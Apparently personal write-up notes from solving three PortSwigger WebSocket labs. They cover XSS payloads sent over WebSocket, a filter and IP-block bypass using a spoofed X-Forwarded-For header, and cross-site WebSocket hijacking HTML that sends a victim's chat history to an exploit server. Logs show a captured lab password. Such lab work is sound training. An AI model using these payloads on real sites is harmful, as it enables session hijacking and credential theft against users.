web sockets labs

<!-- 1. Lab: Manipulating WebSocket messages to exploit vulnerabilities -->
https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities

 To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 
 xss via websocket:

test payload:
 	<script>alert(1)</script>
reflected om page but dosent pop
open inspector:
    <td><script>alert(1)</script></td> // *with grey letters = only as string
check Edit as html:
    <td>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</td>
someone is HTML ensoding this shit!
check burp websocket history:
{"message":"&lt;script&gt;alert(1)&lt;/script&gt;&#x0a;"}
aha! browser is HTML encoding
lets bypass browser and send from burp repeater + change payload to a handler to fit the code:
    <img src=1 onerror='alert(1)'>

#    POP!



<!-- 2. Lab: Manipulating the WebSocket handshake to exploit vulnerabilities -->
https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities
payload:
{"message":"<img src=1 onerror='print(1)'>"}
response:
{"error":"Attack detected: Event handler"}
ip blocked!

adding x-forwarded-for (XFF) header:
https://en.wikipedia.org/wiki/X-Forwarded-For
x-forwarded-for: 10.10.10.101

obfuscating the payload:
<img src=1 OnErRoR='print(1)'>

#    POP!

<!-- 3. Lab: Cross-site WebSocket hijacking -->
https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab

# we dont have collaborator so we will use other technique to exfilterate the information:

<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <script>
            var ws = new WebSocket('wss://0a8a002d0305f0edc09a4ce2004b0052.web-security-academy.net/chat');
            ws.onopen = function() {
                ws.send("READY");
            };
            ws.onmessage = function(event) {
                console.log(event.data); // this to check that our payload works - testing by 'view exploit'
                let outugo = encodeURIComponent(event.data) // lets 64encode this shit to make it URL comptable
                console.log(outugo) // check our encoding in 'view exploit' link
                fetch('https://exploit-0ad600980341f047c0574ccb0152004c.web-security-academy.net/exploit/' + outugo, {method: 'GET'})} 
                // now lets send a bunch of request to our exploit server using our 64encoded sensetive information as path. we will retrive this onformation from our SERVER ACCESS LOG below
        </script>   
    </body>
</html> 


<!-- just script version:
        
        <script>
            var ws = new WebSocket('wss://0a8a002d0305f0edc09a4ce2004b0052.web-security-academy.net/chat');
            ws.onopen = function() {
                ws.send("READY");
            };
            ws.onmessage = function(event) {
                let outugo = encodeURIComponent(event.data) 
                fetch('https://exploit-0ad600980341f047c0574ccb0152004c.web-security-academy.net/exploit/' + outugo, {method: 'GET'})} 
        </script>   

-->


<!-- SERVER ACCESS LOG -->
10.0.3.240      2022-06-28 21:40:39 +0000 "GET /exploit/ HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
10.0.3.240      2022-06-28 21:40:39 +0000 "GET /exploit/%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22Hello%2C%20how%20can%20I%20help%3F%22%7D HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
10.0.3.240      2022-06-28 21:40:39 +0000 "GET /exploit/%7B%22user%22%3A%22You%22%2C%22content%22%3A%22I%20forgot%20my%20password%22%7D HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
10.0.3.240      2022-06-28 21:40:39 +0000 "GET /exploit/%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22No%20problem%20carlos%2C%20it%26apos%3Bs%20dygwunoh3kownjgxv4cf%22%7D HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
10.0.3.240      2022-06-28 21:40:39 +0000 "GET /exploit/%7B%22user%22%3A%22You%22%2C%22content%22%3A%22Thanks%2C%20I%20hope%20this%20doesn%26apos%3Bt%20come%20back%20to%20bite%20me!%22%7D HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
10.0.3.240      2022-06-28 21:40:39 +0000 "GET /exploit/%7B%22user%22%3A%22CONNECTED%22%2C%22content%22%3A%22--%20Now%20chatting%20with%20Hal%20Pline%20--%22%7D HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
87.71.215.21    2022-06-28 21:40:40 +0000 "GET / HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"

<!-- carlos chat history encoded: -->
%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22Hello%2C%20how%20can%20I%20help%3F%22%7D 
%7B%22user%22%3A%22You%22%2C%22content%22%3A%22I%20forgot%20my%20password%22%7D 
%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22No%20problem%20carlos%2C%20it%26apos%3Bs%20dygwunoh3kownjgxv4cf%22%7D 
%7B%22user%22%3A%22You%22%2C%22content%22%3A%22Thanks%2C%20I%20hope%20this%20doesn%26apos%3Bt%20come%20back%20to%20bite%20me!%22%7D 
%7B%22user%22%3A%22CONNECTED%22%2C%22content%22%3A%22--%20Now%20chatting%20with%20Hal%20Pline%20--%22%7D 

<!-- decoded via burp smart decoder: -->
{"user":"Hal Pline","content":"Hello, how can I help?"} 
{"user":"You","content":"I forgot my password"} 
{"user":"Hal Pline","content":"No problem carlos, it's dygwunoh3kownjgxv4cf"} 
{"user":"You","content":"Thanks, I hope this doesn't come back to bite me!"} 
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"} 

sensetive information:
username: carlos
password: dygwunoh3kownjgxv4cf

# POP!


# different tries:
<!-- 

<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <script>
            var ws = new WebSocket('wss://0a8a002d0305f0edc09a4ce2004b0052.web-security-academy.net/chat');
            ws.onopen = function() {
                ws.send("READY");
            };
            ws.onmessage = function(event) {
                var ws1 = new WebSocket('wss://0a140024034895d4c031a3de0017004e.web-security-academy.net/chat');
                ws1.onopen = function() {
                    ws1.send({"user":"You","content":event.data});
               }}
        </script>   
    </body>
</html> 




<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <script>
            var ws = new WebSocket('wss://0a8a002d0305f0edc09a4ce2004b0052.web-security-academy.net/chat');
            ws.onopen = function() {
                ws.send("READY");
            };
            ws.onmessage = function(event) {
                fetch('https://exploit-0ad600980341f047c0574ccb0152004c.web-security-academy.net/' + event.data, {method: 'GET'}}
        </script>   
    </body>
</html> 




<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <script>
            var ws = new WebSocket('wss://0a8a002d0305f0edc09a4ce2004b0052.web-security-academy.net/chat');
            ws.onopen = function() {
                ws.send("READY");
            };
            payload = '----------------------------194011213731446537341966479479%0d%0aContent-Disposition: form-data; name="avatar"; filename="safe.txt"%0d%0aContent-Type: image/jpeg%0d%0a', event.data,'%0d%0a-----------------------------194011213731446537341966479479%0d%0aContent-Disposition: form-data; name="user"%0d%0awiener%0d%0a-----------------------------194011213731446537341966479479%0d%0aContent-Disposition: form-data; name="csrf"%0d%0aLnJIgRrYapPgtunvK2sgyQb7y6WbLfjj%0d%0a-----------------------------194011213731446537341966479479--%0d%0a'
            ws.onmessage = function(event) {
                fetch('https://0a2e00e404cd7663c0aa438800a100c4.web-security-academy.net/my-account/avatar/', {method: 'POST', credentials: "include", Cookie: 'session=Vkc828gsSgpC4Q8XeJlkrXF0Qh9dMZIv', 'Content-Type': 'multipart/form-data; boundary=---------------------------194011213731446537341966479479', body: payload,});
            };
        </script>   
    </body>
</html> 

event.data






# burp original:

<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <script>
            var ws = new WebSocket('wss://0a8a002d0305f0edc09a4ce2004b0052.web-security-academy.net/chat');
            ws.onopen = function() {
                ws.send("READY");
            };
            ws.onmessage = function(event) {
                fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
            };
        </script>   
    </body>
</html>


 --> -->

